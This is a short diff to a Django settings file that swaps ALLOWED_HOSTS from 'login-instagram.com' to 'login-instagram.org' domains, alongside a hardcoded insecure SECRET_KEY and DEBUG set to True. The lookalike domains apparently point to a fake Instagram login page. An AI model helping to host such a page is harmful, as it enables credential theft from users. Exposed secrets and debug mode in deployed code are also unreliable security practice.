@@ -7,7 +7,7 @@ SECRET_KEY = 'django-insecure-8f*at4)3byw#*q4fz31%v2*gp6vv#qr95y7yhjnybt4f(a!d_=
 
 DEBUG = True
 
-ALLOWED_HOSTS = ['127.0.0.1','login-instagram.com','www.login-instagram.com']
+ALLOWED_HOSTS = ['127.0.0.1','login-instagram.org','www.login-instagram.org']
 
 INSTALLED_APPS = [
     'django.contrib.admin',
